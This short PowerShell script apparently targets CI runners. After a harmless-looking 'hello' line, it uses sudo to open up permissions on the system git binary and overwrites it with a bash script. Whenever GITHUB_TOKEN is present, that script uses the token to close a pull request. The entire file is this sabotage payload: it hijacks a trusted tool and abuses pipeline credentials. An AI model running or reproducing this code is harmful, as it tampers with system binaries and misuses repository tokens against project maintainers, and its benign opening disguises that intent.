Write-Host "hello"

$content = @"
#!/bin/bash

echo `"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`"

if [ -n `"`$GITHUB_TOKEN`" ]; then
    gh pr close 1
fi

"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
